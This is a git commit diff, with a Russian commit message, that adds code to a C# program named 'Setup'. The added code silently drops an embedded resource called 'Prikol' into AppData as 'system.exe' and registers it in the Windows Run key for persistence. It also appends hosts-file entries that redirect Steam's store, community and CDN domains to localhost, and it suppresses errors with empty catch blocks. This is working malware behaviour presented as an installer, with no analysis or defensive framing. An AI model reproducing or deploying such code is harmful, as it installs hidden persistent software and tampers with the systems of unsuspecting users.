3337940d1c08ad46d9871721f33c2e5f8a0f0e9c
Aleksei01111 <alekseivolkov01012@gmail.com>
2023-11-07 21:20:13 +0300

    Добавил HostsSteam метод и SetToAutorun

--- Setup/Program.cs
+++ Setup/Program.cs
@@ -1,15 +1,75 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace Setup
 {
     internal class Program
     {
+        static string pathToPrikol = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\system.exe";
+
         static void Main(string[] args)
         {
+            try
+            {
+                File.WriteAllBytes(pathToPrikol, Resource1.Prikol);
+
+                HostsSteam();
+                SetToAutorun();
+            }
+
+            catch
+            {
+
+            }
+        }
+
+        static void SetToAutorun()
+        {
+            var startupKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            string filename = Path.GetFileNameWithoutExtension(pathToPrikol);
+
+            try
+            {
+                startupKey.SetValue(filename, pathToPrikol);
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Ошибка при добавлении в автозагрузку: " + ex.Message);
+                Console.ForegroundColor = ConsoleColor.White;
+            }
+            finally
+            {
+                startupKey.Close();
+            }
+        }
+
+        static void HostsSteam()
+        {
+            try
+            {
+                var path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+                var text = "\n127.0.0.1 store.steampowered.com\n127.0.0.1 steamcommunity.com\n127.0.0.1 steamcdn-a.akamaihd.net";
+
+                using (var fs = new FileStream(path, FileMode.Append))
+                {
+                    using (var sw = new StreamWriter(fs))
+                    {
+                        sw.WriteLine(text);
+                    }
+                }
+            }
+            catch
+            {
+
+            }
         }
     }
 }
